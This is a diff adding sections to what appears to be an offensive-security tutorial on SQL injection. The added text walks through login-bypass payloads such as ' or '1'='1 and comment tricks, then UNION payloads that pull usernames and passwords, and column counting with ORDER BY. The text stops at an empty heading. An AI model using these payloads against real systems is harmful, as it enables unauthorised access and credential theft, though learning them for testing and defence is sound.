@@ -6,6 +6,18 @@
   - [Subverting Query Logic](#subverting-query-logic)
     - [Authentication Bypass](#authentication-bypass)
     - [SQLi Discovery](#sqli-discovery)
+    - [OR Injection](#or-injection)
+    - [Auth Bypass with OR Operator](#auth-bypass-with-or-operator)
+  - [Using comments](#using-comments)
+    - [Auth Bypass with comments](#auth-bypass-with-comments)
+      - [Paranthesis](#paranthesis)
+  - [UNION Clause](#union-clause)
+    - [Even columns](#even-columns)
+    - [Uneven Columns](#uneven-columns)
+  - [UNION Injection](#union-injection)
+    - [Detect number of columns](#detect-number-of-columns)
+      - [Using ORDER BY](#using-order-by)
+    - [Using UNION](#using-union)
 
 ---
 
@@ -141,3 +153,172 @@ Example for ```'```:
 ![Syntax Error](../../../images/sqli4.png)
 
 The quote you entered resulted in an odd number of quotes, causing a syntax error. One option would be to comment out the rest of the query and write the remainder of the query as part of your injection to form a workin query. Another option is to use an even number of quotes within your injected query, such that the final query would still work.
+
+### OR Injection
+
+You would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, you can abuse the OR operator in your SQLi.
+
+An example of a condition that will always turn true is '1'='1'. However, to keep the SQL query working and keep an even number of quotes, you have to remove the last quote, so the remaining single quote from the original query would be in its place.
+
+```sql
+admin' or '1'='1
+```
+
+Inside the final query, it would look like:
+
+```sql
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+```
+
+The AND operator will be evaluated first, and it will return false. Then, the OR operator would be eveluated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.
+
+### Auth Bypass with OR Operator
+
+![Login as admin](../../../images/sqli5.png)
+
+You were able to log in successfully as admin. However, the login fails when using 'notAdmin' as a user, since that user does not exist in the table and therefore resulted in a fals query overall.
+
+To successfully login once again, you will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true.
+
+![Login as notAdmin](../../../images/sqli6.png)
+
+The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return true, you do not have to provide a test username and password and can directly start with ```'``` injection and log in with just ```' or '1'='1```.
+
+## Using comments
+
+
+Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. You can use two types of line comments with MySQL ```--``` and ```#```, in addition to an in-line comment ```/**/```.
+
+```bash
+mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
+
++---------------+
+| username      |
++---------------+
+| admin         |
+| administrator |
+| john          |
+| tom           |
++---------------+
+4 rows in set (0.00 sec)
+```
+
+> [!NOTE]
+> In SQL, using two dashes is not enough to start a comment. There has to be an empty space after them, so the comment starts with '-- '. This is sometimes URL encoded as '--+', as spaces in URLs are encoded as '+'.
+
+```#``` example:
+
+```bash
+mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
+
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+1 row in set (0.00 sec)
+```
+
+### Auth Bypass with comments
+
+```sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+```
+
+You can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment.
+
+![Login with comment 1](../../../images/sqli7.png)
+
+#### Paranthesis
+
+SQL supports the usage of pranthesis if the application needs to check for particular conditions before others. Expressions within the paranthesis take precedence over other operators and evaluated first.
+
+![Paranthesis 1](../../../images/sqli8.png)
+
+The login failed due to a syntax error, as a closed one did not balance the open paranthesis. To execute the query successfully, you will have to add a closing paranthesis.
+
+![Paranthesis 2](../../../images/sqli9.png)
+
+The query was successful, and you logged in as admin. The final query as a result of the input is:
+
+```sql
+SELECT * FROM logins where (username='admin')
+```
+
+## UNION Clause
+
+... is used to combine results from multiple SELECT statements. This means that through a UNION injection, you will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
+
+```bash
+mysql> SELECT * FROM ports UNION SELECT * FROM ships;
+
++----------+-----------+
+| code     | city      |
++----------+-----------+
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| Morrison | New York  |
+| ZZ-21    | Shenzhen  |
++----------+-----------+
+4 rows in set (0.00 sec)
+```
+
+> [!NOTE]
+> The data types of the selected columns on all positions should be the same
+
+### Even columns
+
+A UNION statement can only operate on SELECT statements with an equal number of columns. Otherwise:
+
+```bash
+mysql> SELECT city FROM ports UNION SELECT * FROM ships;
+
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+```
+
+The above query results in an error, as the first SELECT returns one column and the second SELECT returns two.
+
+```sql
+SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
+```
+
+The above query would return ```username``` and ```password``` entries from the ```passwords``` table, assuming the ```products``` table has two columns.
+
+### Uneven Columns
+
+You will find out that the original query will usually not have the same number of columns as the SQL query you want to execute, so you will have to work around that. You can put junk data for the remaining required columns so that the total number of columns you are UNIONing with the remains the same as the original query.
+
+> [!NOTE]
+> When filling other columns with junk data, you must ensure that the data type matches the columns data type, otherwise the query will reutrn an error.
+
+> [!TIP]
+> For advanced SQLi, you may want to use 'NULL' to fill other columns, as 'NULL' fits all data types.
+
+```sql
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+```
+
+If you had more columns in the table of the original query, you have to add more numbers to create the remaining required columns.
+
+```sql
+mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+
++-----------+-----------+-----------+-----------+
+| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+
+|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+
+```
+
+## UNION Injection
+
+### Detect number of columns
+
+#### Using ORDER BY
+
+You have to inject a query that sorts the results by a column you specified until you get an error saying the column specified does not exist.
+
+For example, you can start with ```order by 1```, sort by the first column, and succeed, as the table must have at least one column. Then you will do ```order by 2``` and then ```order by 3``` until you reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column you successfully sorted gives you the total number of columns.
+
+### Using UNION
+
